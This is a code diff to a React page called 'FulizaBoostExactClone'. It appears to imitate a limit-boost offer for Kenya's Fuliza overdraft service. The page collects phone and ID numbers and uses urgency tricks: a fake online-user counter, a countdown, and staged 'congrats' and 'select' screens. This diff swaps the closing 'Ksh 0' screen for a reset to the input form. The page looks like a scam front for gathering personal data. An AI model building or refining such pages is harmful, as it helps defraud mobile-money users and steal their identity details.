@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Final Version (No Phone Prefill)
+// src/app/page.tsx - Final Improved Version (Returns to Input Screen on Done)
 
 import React, { useState, useEffect } from 'react';
 
@@ -22,9 +22,9 @@ const limits = [
 ];
 
 export default function FulizaBoostExactClone() {
-  const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
+  const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select'>('input');
   const [usersOnline, setUsersOnline] = useState(137);
-  const [phoneNumber, setPhoneNumber] = useState(''); // No prefill
+  const [phoneNumber, setPhoneNumber] = useState(''); // Empty - no prefill
   const [enteredPhone, setEnteredPhone] = useState('');
   const [loadingMsg, setLoadingMsg] = useState('');
 
@@ -143,7 +143,10 @@ export default function FulizaBoostExactClone() {
 
   const closeSuccessModal = () => {
     setShowSuccessModal(false);
-    setStep('final');
+    setStep('input');           // Return to Input Screen
+    setPhoneNumber('');         // Clear phone number
+    setEnteredPhone('');
+    setIdNumber('');
     setCountdown(600);
   };
 
@@ -163,7 +166,7 @@ export default function FulizaBoostExactClone() {
 
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
 
-          {/* Input Screen */}
+          {/* ==================== INPUT SCREEN ==================== */}
           {step === 'input' && (
             <>
               <div className="pt-10 pb-6 flex flex-col items-center">
@@ -280,15 +283,6 @@ export default function FulizaBoostExactClone() {
               </button>
             </div>
           )}
-
-          {/* Final Ksh 0 Screen 
-          {step === 'final' && (
-            <div className="px-8 py-16 text-center">
-              <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
-              <p className="text-7xl font-bold text-emerald-600 mt-8">Ksh 0</p>
-              <p className="mt-8 text-sm text-red-500">* Final amount depends on full verification</p>
-            </div>
-          )}*/}
         </div>
       </div>
 
